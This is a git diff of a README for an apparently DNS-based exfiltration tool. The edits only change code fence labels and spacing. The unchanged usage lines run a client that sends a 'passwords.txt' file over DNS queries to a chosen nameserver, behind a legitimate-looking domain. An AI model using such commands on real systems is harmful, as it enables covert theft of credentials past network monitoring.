@@ -29,6 +29,7 @@ You can install the required Python packages using pip:
 ```bash
 python3 ./server.py -o output.txt
 ``` 
+
 Pro Server Options
 
 ```bash
@@ -43,12 +44,13 @@ The server will start listening on port `53` for incoming DNS queries.
 
 Here's an example of how to run the client script:
 
-```sh
+```bash
 python3 ./client.py -d "google.com" -f "passwords.txt"
 ```
 
 Pro Client Options
-```sh
+
+```bash
 python3 client.py -d legitimate-domain.com -f passwords.txt -p 53 --nameserver 10.10.166.126
 ```
 
